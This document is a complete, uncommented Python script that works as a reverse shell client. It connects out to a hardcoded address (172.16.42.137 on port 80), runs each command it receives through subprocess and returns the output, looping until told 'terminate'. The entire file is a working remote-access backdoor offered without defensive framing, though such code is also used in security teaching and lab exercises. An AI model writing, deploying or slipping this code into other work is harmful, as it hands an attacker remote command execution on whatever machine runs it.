import socket
import subprocess
import shlex

HOST = "172.16.42.137"
PORT = 80

def execute(command):
    cmd = command.strip()
    if not cmd:
        return
    
    try:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((HOST, PORT))
    except ConnectionRefusedError as e:
        print('[-] Host is down')
        exit(1)
    
    while True:
        cmd = s.recv(4096)

        if 'terminate' in cmd.decode():
            s.close()
            break
        
        output = execute(cmd.decode())

        try:
            if output:
                s.send(output.encode())
            else:
                s.send('done'.encode())
        except BrokenPipeError as bpe:
            print('[-] Host disconnected')
            exit(1)
            
def main():
    connect()

if __name__ == "__main__":
    main()